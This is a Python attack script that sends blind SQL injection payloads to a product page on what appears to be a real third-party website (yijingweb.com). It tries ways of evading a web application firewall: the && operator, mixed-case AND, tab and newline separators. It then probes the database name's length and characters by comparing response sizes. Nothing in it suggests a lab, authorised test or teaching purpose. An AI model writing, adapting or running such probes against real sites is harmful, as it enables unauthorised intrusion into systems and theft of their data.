#!/usr/bin/env python3
"""yijingweb: bypass AND WAF - try &&, arithmetic, XOR, no-space tricks"""
import urllib.request, re, time

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
BASE = "http://yijingweb.com/webmall/detail.php"

def fetch(url, timeout=12):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, len(r.read())
    except urllib.error.HTTPError as e:
        return e.code, len(e.read(5000))
    except Exception:
        return 0, 0

def sz(payload):
    code, size = fetch(BASE + "?id=686" + payload)
    return size

print("=== AND bypass probes ===")
tests = [
    ("%27%20AND%20(select%201)=1--%20", "AND-subq"),       # baseline (was blocked?)
    ("%27%20%26%26%20(select%201)=1--%20", "&&-subq"),      # && operator
    ("%27%20aNd%20(select%201)=1--%20", "aNd-mixed"),
    ("%27%09AND%09(select%201)=1--%20", "AND-tab"),
    ("%27%0aAND%0a(select%201)=1--%20", "AND-newline"),
    ("%27%20AND%20(select%20length(database()))=6--%20", "AND-len6"),
    ("%27%20AND%20(select%20length(database()))=7--%20", "AND-len7"),
    ("%27%20AND%20(select%20substr(database(),1,1))='a'--%20", "AND-substr"),
    ("%27%20AND%20(select%201)=2--%20", "AND-false"),
]
for p, tag in tests:
    sizes = [sz(p) for _ in range(2)]
    print("  %-18s %s" % (tag, sizes))
    time.sleep(0.4)
